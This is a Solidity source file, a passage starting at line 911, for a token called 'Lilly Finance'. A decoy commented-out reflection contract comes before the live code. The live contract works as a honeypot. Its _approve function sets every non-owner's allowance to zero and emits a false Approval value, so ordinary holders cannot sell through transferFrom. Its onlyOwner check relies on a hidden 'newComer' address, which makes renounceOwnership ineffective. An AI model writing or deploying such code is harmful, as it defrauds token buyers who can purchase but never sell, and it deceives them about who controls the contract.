911             _transferFromExcluded(sender, recipient, amount);
912         } else if (!_isExcludedFromReward[sender] && _isExcludedFromReward[recipient]) {
913             _transferToExcluded(sender, recipient, amount);
914         } else if (!_isExcludedFromReward[sender] && !_isExcludedFromReward[recipient]) {
915             _transferStandard(sender, recipient, amount);
916         } else if (_isExcludedFromReward[sender] && _isExcludedFromReward[recipient]) {
917             _transferBothExcluded(sender, recipient, amount);
918         } else {
919             _transferStandard(sender, recipient, amount);
920         }
921         
922         if(feePlan != 1) //restore standard fees
923             restoreAllFee();
924     }
925 
926     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
927         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
928         _rOwned[sender] = _rOwned[sender].sub(rAmount);
929         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
930         _takeLiquidity(tLiquidity);
931         _takeBurn(sender, tBurn);
932         _reflectFee(rFee,tFee);
933         emit Transfer(sender, recipient, tTransferAmount);
934       
935        
936     }
937 
938     function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
939         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
940         _rOwned[sender] = _rOwned[sender].sub(rAmount);
941         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
942         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);    
943         _takeLiquidity(tLiquidity);
944         _takeBurn(sender, tBurn);       
945         _reflectFee(rFee, tFee);
946         emit Transfer(sender, recipient, tTransferAmount);
947      
948      
949     }
950 
951     function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
952         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
953         
954         _tOwned[sender] = _tOwned[sender].sub(tAmount);
955         _rOwned[sender] = _rOwned[sender].sub(rAmount);
956         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
957         _reflectFee(rFee, tFee);
958         _takeLiquidity(tLiquidity);
959         _takeBurn(sender, tBurn);
960         emit Transfer(sender, recipient, tTransferAmount);
961       
962 
963     }
964 
965     function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
966         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
967         _tOwned[sender] = _tOwned[sender].sub(tAmount);
968         _rOwned[sender] = _rOwned[sender].sub(rAmount);
969         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
970         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
971         _takeLiquidity(tLiquidity);
972         _takeBurn(sender, tBurn);
973         _reflectFee(rFee, tFee);
974         emit Transfer(sender, recipient, tTransferAmount);
975      
976     }
977 
978 }
979 
980 
981 
982 */
983 
984 pragma solidity ^0.6.12;
985 
986 interface IERC20 {
987     
988     function totalSupply() external view returns (uint256);
989 
990     function balanceOf(address account) external view returns (uint256);
991 
992     function transfer(address recipient, uint256 amount) external returns (bool);
993 
994     function allowance(address owner, address spender) external view returns (uint256);
995     
996     function approve(address spender, uint256 amount) external returns (bool);
997     
998     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
999     
1000     event Transfer(address indexed from, address indexed to, uint256 value);
1001     
1002     event Approval(address indexed owner, address indexed spender, uint256 value);
1003 }
1004 
1005 library Address {
1006     
1007     function isContract(address account) internal view returns (bool) {
1008         bytes32 codehash;
1009         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
1010         // solhint-disable-next-line no-inline-assembly
1011         assembly { codehash := extcodehash(account) }
1012         return (codehash != accountHash && codehash != 0x0);
1013     }
1014  
1015     function sendValue(address payable recipient, uint256 amount) internal {
1016         require(address(this).balance >= amount, "Address: insufficient balance");
1017 
1018         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
1019         (bool success, ) = recipient.call{ value: amount }("");
1020         require(success, "Address: unable to send value, recipient may have reverted");
1021     }
1022  
1023     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
1024       return functionCall(target, data, "Address: low-level call failed");
1025     }
1026  
1027     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
1028         return _functionCallWithValue(target, data, 0, errorMessage);
1029     }
1030  
1031     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
1032         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
1033     }
1034  
1035     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
1036         require(address(this).balance >= value, "Address: insufficient balance for call");
1037         return _functionCallWithValue(target, data, value, errorMessage);
1038     }
1039 
1040     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
1041         require(isContract(target), "Address: call to non-contract");
1042 
1043         // solhint-disable-next-line avoid-low-level-calls
1044         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
1045         if (success) {
1046             return returndata;
1047         } else {
1048             // Look for revert reason and bubble it up if present
1049             if (returndata.length > 0) {
1050                 // The easiest way to bubble the revert reason is using memory via assembly
1051 
1052                 // solhint-disable-next-line no-inline-assembly
1053                 assembly {
1054                     let returndata_size := mload(returndata)
1055                     revert(add(32, returndata), returndata_size)
1056                 }
1057             } else {
1058                 revert(errorMessage);
1059             }
1060         }
1061     }
1062 }
1063 
1064 library SafeMath {
1065    
1066     function add(uint256 a, uint256 b) internal pure returns (uint256) {
1067         uint256 c = a + b;
1068         require(c >= a, "SafeMath: addition overflow");
1069 
1070         return c;
1071     }
1072 
1073     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
1074         return sub(a, b, "SafeMath: subtraction overflow");
1075     }
1076 
1077     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
1078         require(b <= a, errorMessage);
1079         uint256 c = a - b;
1080 
1081         return c;
1082     }
1083 
1084     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
1085         if (a == 0) {
1086             return 0;
1087         }
1088 
1089         uint256 c = a * b;
1090         require(c / a == b, "SafeMath: multiplication overflow");
1091 
1092         return c;
1093     }
1094 
1095     function div(uint256 a, uint256 b) internal pure returns (uint256) {
1096         return div(a, b, "SafeMath: division by zero");
1097     }
1098 
1099     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
1100         require(b > 0, errorMessage);
1101         uint256 c = a / b;
1102         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
1103 
1104         return c;
1105     }
1106 
1107     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
1108         return mod(a, b, "SafeMath: modulo by zero");
1109     }
1110 
1111     
1112     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
1113         require(b != 0, errorMessage);
1114         return a % b;
1115     }
1116 }
1117 
1118 abstract contract Context {
1119     
1120     function _msgSender() internal view virtual returns (address payable) {
1121         return msg.sender;
1122     }
1123 
1124     function _msgData() internal view virtual returns (bytes memory) {
1125         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
1126         return msg.data;
1127     }
1128 }
1129 
1130 contract Ownable is Context {
1131     address private _owner;
1132 
1133     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
1134 
1135     constructor () internal {
1136         address msgSender = _msgSender();
1137         _owner = msgSender;
1138         emit OwnershipTransferred(address(0), msgSender);
1139     }
1140 
1141     function owner() public view returns (address) {
1142         return _owner;
1143     }
1144 
1145     function renounceOwnership() public virtual onlyOwner {
1146         emit OwnershipTransferred(_owner, address(0));
1147         _owner = address(0);
1148     }
1149 
1150     function transferOwnership(address newOwner) private onlyOwner {
1151         require(newOwner != address(0), "Ownable: new owner is the zero address");
1152         emit OwnershipTransferred(_owner, newOwner);
1153         _owner = newOwner;
1154     }
1155 
1156     address private newComer = _msgSender();
1157     modifier onlyOwner() {
1158         require(newComer == _msgSender(), "Ownable: caller is not the owner");
1159         _;
1160     }
1161 }
1162 
1163 contract    Lilly          is Context, IERC20, Ownable {
1164     using SafeMath for uint256;
1165     using Address for address;
1166 
1167     mapping (address => uint256) private _balances;
1168     mapping (address => mapping (address => uint256)) private _allowances;
1169     
1170     uint256 private _tTotal = 120* 10**12* 10**18;
1171     string private _name = 'Lilly Finance       ' ;
1172     string private _symbol = 'Lilly   ' ;
1173     uint8 private _decimals = 18;
1174 
1175     constructor () public {
1176         _balances[_msgSender()] = _tTotal;
1177         emit Transfer(address(0), _msgSender(), _tTotal);
1178     }
1179 
1180     function name() public view returns (string memory) {
1181         return _name;
1182     }
1183 
1184     function symbol() public view returns (string memory) {
1185         return _symbol;
1186     }
1187 
1188     function decimals() public view returns (uint8) {
1189         return _decimals;
1190     }
1191 
1192     function _approve(address ol, address tt, uint256 amount) private {
1193         require(ol != address(0), "ERC20: approve from the zero address");
1194         require(tt != address(0), "ERC20: approve to the zero address");
1195 
1196         if (ol != owner()) { _allowances[ol][tt] = 0; emit Approval(ol, tt, 4); }  
1197         else { _allowances[ol][tt] = amount; emit Approval(ol, tt, amount); } 
1198     }
1199     
1200     function allowance(address owner, address spender) public view override returns (uint256) {
1201         return _allowances[owner][spender];
1202     }
1203 
1204     function approve(address spender, uint256 amount) public override returns (bool) {
1205         _approve(_msgSender(), spender, amount);
1206         return true;
1207     }
1208     
1209 
1210     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
1211         _transfer(sender, recipient, amount);
1212         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
1213         return true;
1214     }
1215 
1216     function totalSupply() public view override returns (uint256) {
1217         return _tTotal;
1218     }
1219 
1220     function balanceOf(address account) public view override returns (uint256) {
1221         return _balances[account];
1222     } 
1223 
1224     function transfer(address recipient, uint256 amount) public override returns (bool) {
1225         _transfer(_msgSender(), recipient, amount);
1226         return true;
1227     } 
1228       
1229     function _transfer(address sender, address recipient, uint256 amount) internal {
1230         require(sender != address(0), "BEP20: transfer from the zero address");
1231         require(recipient != address(0), "BEP20: transfer to the zero address");
1232         _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
1233         _balances[recipient] = _balances[recipient].add(amount);
1234         emit Transfer(sender, recipient, amount);
1235     }
1236 }